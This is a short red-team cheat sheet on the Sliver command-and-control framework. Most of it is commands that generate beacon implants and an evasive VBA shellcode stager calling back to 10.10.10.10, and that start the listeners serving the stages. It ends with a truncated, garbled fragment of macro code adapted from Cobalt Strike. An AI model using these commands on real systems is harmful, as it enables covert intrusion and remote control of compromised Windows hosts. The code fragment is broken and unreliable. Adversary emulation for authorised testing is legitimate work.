# Sliver C2

Sliver is an open source cross-platform adversary emulation/red team framework.&#x20;

## Terminology

* Beacon - a malware that stays on hosts and calls back to C2 from time to time (default sleep time is 60 seconds)
* Sessions - a malware that allows to interact with host in interactive mode, without need to wait for sleep time

## Basic usage

Connect to sliver server:

```
sliver
```

Create new beacon:

```
generate beacon --http 10.10.10.10:443 --save ~/payload.exe
```

Beacons can be switched to sessions via `interactive` command

## Creating stager and VBA payload

Sliver binaries are pretty big (\~16MB), because it uses Golang. For OPSEC and to write evasive payloads, you need to use stagers.

**Stager** is a type of payload that loads "stages" from C2 to build full payload in memory. It is more evasive as it does not leave any artifacts on the disk and the size of stager is much smaller (\~250B)

To use stager in sliver, you need to do the following:

### Create profile with defined payload

```
sliver > profiles new -l --mtls 10.10.10.10:5050 -f shellcode -a x86 -o windows example
```

### Generate stager

```
sliver > generate stager -f vbapplication -L 10.10.10.10 -l 443 --protocol tcp -a x86
```

### Start stager listener

```
sliver > stager-listener --url tcp://10.10.10.10:443 --profile example
```

### Run the listener for payload

```
sliver > mtls -l 5050
```

### Craft VBA

I use slightly modified VBA from Cobalt Strike:

```visual-basic

    hThread As Long

    dwThreadId As Long

    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long

End Type
